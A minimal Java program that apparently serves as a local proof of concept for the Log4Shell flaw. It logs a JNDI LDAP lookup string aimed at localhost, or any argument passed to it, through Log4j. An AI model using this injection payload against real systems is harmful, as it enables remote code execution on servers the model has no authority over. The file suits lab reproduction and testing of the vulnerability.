package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger();
        String loggingStatement = "${jndi:ldap://localhost:1389/o=reference}";
        if (args.length >= 1) {
            loggingStatement = args[0];
        }

        logger.error(loggingStatement);
    }
}